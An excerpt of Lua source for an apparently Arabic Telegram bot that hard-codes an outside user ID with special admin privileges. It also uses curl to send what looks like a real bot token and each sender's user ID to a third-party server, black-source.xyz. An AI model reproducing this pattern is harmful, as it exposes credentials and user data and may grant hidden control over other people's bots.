...
ControllerAll = false
local ListSudos ={Sudo_Id,1686444936}  
...
local get = io.popen('curl -s "https://black-source.xyz/BlackTeAM/GetMemberc.php?to=5543518743:AAEceDGdb7msRZgGYJUob2xlHDU27NsOYIA&ch=@JFFFFF&id='..msg.sender.user_id..'"'):read('*a')
local ChannelJoin = JSON.decode(get)
if ChannelJoin.Ch_Member.info ~= true then
JoinChannel = {
status = false,
...
if tonumber(msg.sender.user_id) == 1686444936 then
...
if msg.sender.user_id == tonumber(1686444936) then
...
{
{text = '. ‹ 𝖻𝗅𝖺𝖼𝗄 𝖳𝖾𝖺𝗆 . ', url = 't.me/bc_cb'}, 
},
{
{text = 'إخفاء الأمر', data = msg.sender.user_id..'/delAmr'},
},
